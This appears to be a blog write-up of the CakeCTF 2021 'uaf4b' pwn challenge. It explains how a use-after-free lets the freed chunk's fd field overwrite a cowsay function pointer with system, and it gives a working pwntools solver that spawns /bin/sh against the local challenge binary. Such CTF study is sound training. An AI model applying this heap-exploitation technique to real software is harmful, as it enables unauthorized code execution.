---
title: "uaf4b - CakeCTF2021"
date: 2022-05-10T11:06:51+09:00
tags: ["pwn", "CakeCTF", "ptr-yudai's chall"]
draft: false
---

# Plan
Overwrite the function pointer with `system` function by Use After Free.

## About CAWSAY struct
In freed chunk, `fn_dialogue` is assigned to `fd` 
and `message` is assigned to `bk`.

```c
typedef struct {
  void (*fn_dialogue)(char*);
  char *message;
} COWSAY;
```

Also, you pay attention to execute `cowsay->fn_dialogue(cowsay->message);` in L167~171 in `main.c`.
```c
case 1:
  /* Use cowsay */
  printf("[+] You're trying to call 0x%016lx\n", (addr)cow
say->fn_dialogue);
  cowsay->fn_dialogue(cowsay->message);
  break;
```

## malloced chunk
When it malloced, Heap area is following.

[![mallocedchunk](https://i.gyazo.com/f3ef9ad8fe8cc16b6db4e9b59e3347d3.png)](https://gyazo.com/f3ef9ad8fe8cc16b6db4e9b59e3347d3)

## freed chunk
Next, when it freed, it is following.

[![freedchunk](https://i.gyazo.com/dcb349b359e86031b4d3575a85de9b8e.png)](https://gyazo.com/dcb349b359e86031b4d3575a85de9b8e)

## Call the `system("/bin/sh")`
As you can see from these two figure, `fn_dialogue` is assigned to `fd`.
In other word, if you change `fn_dialogue` to `system`, it is called `system("/bin/sh")`.

# [Solver](https://github.com/yu1hpa/ctf-writeup/tree/master/2021/CakeCTF/uaf4b)
```python
from pwn import *

context(os = 'linux', arch = 'amd64')
context.log_level = 'debug'

io = process("./chall")

io.recvuntil("<system> = ")
system_addr = int(io.recvline(), 16)

io.sendlineafter("> ", "2")
io.sendlineafter("Message: ", "/bin/sh")

io.sendlineafter("> ", "4")
io.recvuntil("cowsay->message")
message_addr = int(io.recvuntil("|")[:16], 16)
print(f'{message_addr:x}')

io.sendlineafter("> ", "3") # free
io.sendlineafter("> ", "2")     # fd ↓               # bk ↓
io.sendlineafter("Message: ", p64(system_addr) + p64(message_addr)) # system(/bin/sh)

io.sendlineafter("> ", "4")
io.sendlineafter("> ", "1")

io.interactive()
````

# Final heap area

[![FinalHeapArea](https://i.gyazo.com/ea4b3c9b6166f1d35070ebe0823a9922.png)](https://gyazo.com/ea4b3c9b6166f1d35070ebe0823a9922)
